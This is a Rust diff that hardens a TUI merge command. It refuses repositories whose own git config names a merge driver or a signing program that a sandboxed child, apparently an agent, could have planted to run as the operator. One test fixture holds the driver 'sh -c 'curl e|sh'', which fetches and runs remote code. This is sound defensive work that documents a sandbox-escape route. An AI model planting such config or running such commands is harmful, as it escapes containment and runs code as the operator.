@@ -1091,11 +1091,20 @@ pub fn branch_merge(repo: &Path, branch: &str) -> Result<std::process::Command, 
     }
 }
 
+/// The signing programs a merge commit would run: `gpg.program`, each `gpg.<format>.program`
+/// and `gpg.ssh.defaultKeyCommand` (git lowercases the key names it lists).
+const SIGNING_PROGRAMS: &str = r"^gpg\.(([^.]*\.)?program|ssh\.defaultkeycommand)$";
+
 /// Why the TUI will not merge in `repo`, or `None`: the repository's own configuration names a
-/// filter or merge driver ([`crate::gitcmd::repo_drivers`]) — a program a merge would run as the
-/// operator, set where a child could have set it — or git could not say whether it does.
+/// filter or merge driver ([`crate::gitcmd::repo_drivers`]) or a signing program
+/// ([`SIGNING_PROGRAMS`]) — a program a merge would run as the operator, set where a child could
+/// have set it — or git could not say whether it does. The operator's own (global) signing stays.
 fn merge_refusal(repo: &Path) -> Option<String> {
-    match crate::gitcmd::repo_drivers(repo) {
+    let keys = crate::gitcmd::repo_drivers(repo).and_then(|mut keys| {
+        keys.extend(crate::gitcmd::local_keys(repo, SIGNING_PROGRAMS)?);
+        Ok(keys)
+    });
+    match keys {
         Ok(keys) if keys.is_empty() => None,
         Ok(keys) => Some(
             marion_core::text::visible(&format!(
@@ -1115,9 +1124,10 @@ fn merge_refusal(repo: &Path) -> Option<String> {
 /// What [`git_in`] sets over the repository's configuration, which is shared with every worktree a
 /// child wrote in, so any program it names may be one a child planted, run here as the operator
 /// outside any sandbox: no pager, no hooks, no editor (a merge takes git's own message), no
-/// global attributes file, attributes read from `HEAD` (the operator's commit, not the branch
-/// being merged, so a branch's `.gitattributes` selects no driver), and no signing program.
-/// The operator's own hooks and signing do not run on a merge made here.
+/// global attributes file, and attributes read from `HEAD` (the operator's commit, not the branch
+/// being merged, so a branch's `.gitattributes` selects no driver). The operator's own hooks do
+/// not run on a merge made here; their own signing does, and [`merge_refusal`] refuses a signing
+/// program the repository's configuration names.
 const TUI_GIT_HARDENING: &[&str] = &[
     "--no-pager",
     "--attr-source=HEAD",
@@ -1127,10 +1137,6 @@ const TUI_GIT_HARDENING: &[&str] = &[
     "core.editor=true",
     "-c",
     "core.attributesFile=/dev/null",
-    "-c",
-    "commit.gpgSign=false",
-    "-c",
-    "gpg.program=",
 ];
 
 /// **The command line `effect` shows the operator ([`Effect::argv`]), run in `repo` with the
@@ -1188,10 +1194,6 @@ mod tests {
                 "core.editor=true",
                 "-c",
                 "core.attributesFile=/dev/null",
-                "-c",
-                "commit.gpgSign=false",
-                "-c",
-                "gpg.program=",
                 "merge",
                 "--no-ff",
                 "--",
@@ -1227,6 +1229,37 @@ mod tests {
         git(&["config", "merge.evil.driver", "sh -c 'curl e|sh' %A"]);
         let why = merge_refusal(&dir).expect("refused");
         assert!(why.contains("merge.evil.driver"), "{why}");
+    }
+
+    /// **The TUI will not merge where the repository's own config names a signing program**, any
+    /// of the three a merge commit could run, while a plain signing setting there is no program.
+    #[test]
+    fn a_planted_signing_program_in_the_repository_config_refuses_the_merge() {
+        let dir = marion_testsupport::scratch("tui-merge-signing");
+        let git = |args: &[&str]| {
+            assert!(
+                marion_harness::env_filter::git_command()
+                    .current_dir(&dir)
+                    .args(args)
+                    .status()
+                    .unwrap()
+                    .success()
+            )
+        };
+        git(&["init", "-q"]);
+        git(&["config", "commit.gpgSign", "true"]);
+        git(&["config", "gpg.format", "ssh"]);
+        assert_eq!(merge_refusal(&dir), None);
+        for (key, named) in [
+            ("gpg.program", "gpg.program"),
+            ("gpg.ssh.program", "gpg.ssh.program"),
+            ("gpg.ssh.defaultKeyCommand", "gpg.ssh.defaultkeycommand"),
+        ] {
+            git(&["config", key, "/tmp/planted"]);
+            let why = merge_refusal(&dir).expect("refused");
+            assert!(why.contains(named), "{why}");
+            git(&["config", "--unset", key]);
+        }
     }
 
     #[test]
